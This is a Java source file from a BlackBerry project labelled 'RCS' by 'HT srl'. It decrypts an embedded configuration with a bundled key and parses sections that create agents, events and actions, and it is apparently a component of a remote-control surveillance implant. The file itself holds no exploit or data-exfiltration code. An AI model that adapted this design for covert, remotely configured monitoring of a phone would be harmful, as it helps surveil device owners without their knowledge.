/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Conf.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry;

import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.event.Event;
import com.ht.rcs.blackberry.params.Parameter;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Conf.
 */
public class Conf {

    /** The debug. */
    private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);

    public static final String NEW_CONF = "newconfig.dat";

    /** The Constant CONF_TIMER_SINGLE. */
    public static final int CONF_TIMER_SINGLE = 0x0;

    /** The Constant CONF_TIMER_REPEAT. */
    public static final int CONF_TIMER_REPEAT = 0x1;

    /** The Constant CONF_TIMER_DATE. */
    public static final int CONF_TIMER_DATE = 0x2;

    /** The Constant CONF_TIMER_DELTA. */
    public static final int CONF_TIMER_DELTA = 0x3;

    /**
     * Tag del file di configurazione, sono stringhe ASCII Configurazione degli
     * agenti
     */
    public static final String AGENT_CONF_DELIMITER = "AGENTCONFS-";

    /**
     * The Constant EVENT_CONF_DELIMITER. Configurazione degli eventi
     */
    public static final String EVENT_CONF_DELIMITER = "EVENTCONFS-";

    /**
     * The Constant MOBIL_CONF_DELIMITER. Opzioni per le piattaforme mobili
     */
    public static final String MOBIL_CONF_DELIMITER = "MOBILCONFS-";

    /**
     * The Constant ENDOF_CONF_DELIMITER. Marker di fine configurazione
     */
    public static final String ENDOF_CONF_DELIMITER = "ENDOFCONFS-";

    /**
     * Crc verify.
     * 
     * @param payload
     *            the payload
     * @param crcExpected
     *            the crc expected
     * @return true, if successful
     */
    public static boolean crcVerify(byte[] payload, int crcExpected) {
        boolean crcOK = false;

        int crcCalc = Utils.crc(payload);
        crcOK = (crcExpected == crcCalc);

        return crcOK;
    }

    /** The agent index. */
    int agentIndex = -1;

    /** The event index. */
    int eventIndex = -1;

    /** The mobile index. */
    int mobileIndex = -1;

    /** The action index. */
    int actionIndex = -1;

    /** The endof index. */
    int endofIndex = -1;

    /** The status obj. */
    Status statusObj = null;

    /**
     * Instantiates a new conf.
     */
    public Conf() {
        statusObj = Status.getInstance();
        statusObj.clear();
    }

    /**
     * Load.
     * 
     * @return true, if successful
     */
    public boolean load() {
        // TODO: verificare che ci sia Conf.NEW_CONF
        InputStream i0 = Conf.class.getResourceAsStream("config/config.bin");
        // InputStream i0 =
        // Conf.class.getResourceAsStream("config/plainconfig.bin");

        Check.asserts(i0 != null, "Resource config");

        byte[] confKey = Keys.getConfKey();
        boolean ret = loadCyphered(i0, confKey);

        return ret;
    }

    /**
     * Load cyphered.
     * 
     * @param i0
     *            the i0
     * @param confKey
     *            the conf key
     * @return true, if successful
     */
    public boolean loadCyphered(final InputStream i0, final byte[] confKey) {
        int len;
        boolean ret = false;

        final int cryptoOffset = 8;
        try {
            len = i0.available();
            byte[] cyphered = new byte[len];
            i0.read(cyphered);

            debug.trace("cypher len: " + len);

            Encryption crypto = new Encryption();
            crypto.makeKey(confKey);

            byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
            debug.trace("plain len: " + plainconf.length);
            cyphered = null;

            // lettura della configurazione
            ret = parseConf(plainconf, 0);

        } catch (IOException e) {
            debug.error("Cannot read cyphered");
        }

        return ret;
    }

    /**
     * Parses the action.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseAction(DataBuffer databuffer) throws EOFException {
        if (actionIndex < 0) {
            debug.trace("ParseAction - NO SECTION");
            return false;
        }

        databuffer.setPosition(actionIndex);

        int numTokens = databuffer.readInt();

        debug.trace("ParseAction - numTokens: " + numTokens);

        for (int idAction = 0; idAction < numTokens; idAction++) {
            debug.trace("ParseEvent - Action: " + idAction);
            Action action = new Action(idAction);

            int numSubActions = databuffer.readInt();

            for (int sub = 0; sub < numSubActions; sub++) {
                int actionType = databuffer.readInt();
                int paramLen = databuffer.readInt();

                byte[] confParams = new byte[paramLen];
                databuffer.readFully(confParams);

                debug.trace("ParseEvent - addNewSubAction: " + actionType);
                action.addNewSubAction(actionType, confParams);
            }

            statusObj.addAction(action);
        }

        debug.trace("ParseAction - OK");

        return true;
    }

    /**
     * Parses the agent.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseAgent(DataBuffer databuffer) throws EOFException {
        if (agentIndex < 0) {
            debug.trace("ParseAgent - NO SECTION");
            return false;
        }

        databuffer.setPosition(agentIndex + AGENT_CONF_DELIMITER.length() + 1);

        int numTokens = databuffer.readInt();

        debug.trace("ParseAgent - numTokens: " + numTokens);

        for (int i = 0; i < numTokens; i++) {
            int agentType = databuffer.readInt();
            int agentStatus = databuffer.readInt();
            int paramLen = databuffer.readInt();

            byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            debug.trace("ParseAgent - factory: " + agentType + " status: "
                    + agentStatus);
            Agent agent = Agent.factory(agentType, agentStatus, confParams);
            statusObj.addAgent(agent);
        }

        debug.trace("ParseAgent - OK");

        return true;
    }

    /**
     * Parses the conf.
     * 
     * @param plainConf
     *            the plain conf
     * @param offset
     *            the offset
     * @return true, if successful
     */
    public boolean parseConf(byte[] plainConf, int offset) {
        DataBuffer databuffer = new DataBuffer(plainConf, offset,
                plainConf.length - offset, false);

        // Check crc e sezioni
        try {
            int len = databuffer.readInt();
            int payloadSize = len - 4;

            if (len <= 0 || payloadSize <= 0) {
                debug.error("Conf len error");
                return false;
            }

            byte[] payload = new byte[0];

            debug.trace("Allocating size:" + payloadSize);

            if (payloadSize > plainConf.length) {
                debug.error("wrong decoding len");
                return false;
            }

            payload = new byte[payloadSize];
            databuffer.setPosition(0);
            databuffer.readFully(payload);

            databuffer.setPosition(payloadSize);
            int crcExpected = databuffer.readInt();

            boolean crcOK = crcVerify(payload, crcExpected);

            if (!crcOK) {
                debug.error("ParseConf - CRC FAILED");
                return false;
            }

            // verifica sezioni
            searchSectionIndex(payload);

            Check.asserts(
                    endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
                    "ENDOF Wrong");

            debug.trace("ParseConf - CRC OK");

        } catch (EOFException e) {
            debug.error("ParseConf - FAILED");
            return false;
        }

        // Sezione Agenti
        try {
            if (!parseAgent(databuffer)) {
                debug.error("ParseAgent - FAILED [0]");
                return false;
            }

            // Sezione Eventi
            if (!parseEvent(databuffer)) {
                debug.error("ParseEvent - FAILED [1]");
                return false;
            }

            // Sezione Azioni
            if (!parseAction(databuffer)) {
                debug.error("ParseAction - FAILED [2]");
                return false;
            }

            // Leggi i parametri di configurazione
            if (!parseParameters(databuffer)) {
                debug.error("ParseParameters - FAILED [3]");
                return false;
            }

        } catch (EOFException e) {
            debug.error("ParseConf - FAILED:" + e);
            return false;
        }

        debug.trace("ParseConf - OK");
        return true;
    }

    /**
     * Parses the event.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseEvent(DataBuffer databuffer) throws EOFException {
        if (eventIndex < 0) {
            debug.trace("ParseEvent - NO SECTION");
            return false;
        }

        databuffer.setPosition(eventIndex + EVENT_CONF_DELIMITER.length() + 1);

        int numTokens = databuffer.readInt();

        debug.trace("ParseEvent - numTokens: " + numTokens);

        for (int i = 0; i < numTokens; i++) {
            int eventType = databuffer.readInt();
            int actionId = databuffer.readInt();
            int paramLen = databuffer.readInt();

            byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            debug.trace("ParseEvent - factory: " + eventType + " action: "
                    + actionId);
            Event event = Event.factory(i, eventType, actionId, confParams);
            statusObj.addEvent(i, event);
        }

        debug.trace("ParseEvent - OK");

        actionIndex = databuffer.getPosition();

        return true;
    }

    /**
     * Parses the parameters.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseParameters(DataBuffer databuffer) throws EOFException {
        if (mobileIndex < 0) {
            debug.trace("ParseParameters - NO SECTION");
            return false;
        }

        databuffer.setPosition(mobileIndex + MOBIL_CONF_DELIMITER.length() + 1);

        int numTokens = databuffer.readInt();

        debug.trace("ParseParameters - numTokens: " + numTokens);

        for (int i = 0; i < numTokens; i++) {
            int confId = databuffer.readInt();
            int paramLen = databuffer.readInt();

            byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            Parameter config = Parameter.factory(confId, confParams);
            statusObj.addParameter(config);
        }

        return true;
    }

    /**
     * Search section index.
     * 
     * @param payload
     *            the payload
     */
    public void searchSectionIndex(byte[] payload) {
        // AGENT_CONF_DELIMITER ="AGENTCONFS-"; // Configurazione degli agenti
        // EVENT_CONF_DELIMITER ="EVENTCONFS-"; // Configurazione degli eventi
        // MOBIL_CONF_DELIMITER ="MOBILCONFS-"; // Opzioni per le piattaforme
        // mobili
        // ENDOF_CONF_DELIMITER ="ENDOFCONFS-"; // Marker di fine configurazione

        agentIndex = Utils.getIndex(payload, AGENT_CONF_DELIMITER.getBytes());
        eventIndex = Utils.getIndex(payload, EVENT_CONF_DELIMITER.getBytes());
        mobileIndex = Utils.getIndex(payload, MOBIL_CONF_DELIMITER.getBytes());
        // actionIndex=getIndex(payload,AGENT_CONF_DELIMITER.getBytes());
        endofIndex = Utils.getIndex(payload, ENDOF_CONF_DELIMITER.getBytes());

        debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
        debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
        debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
        debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
    }
}
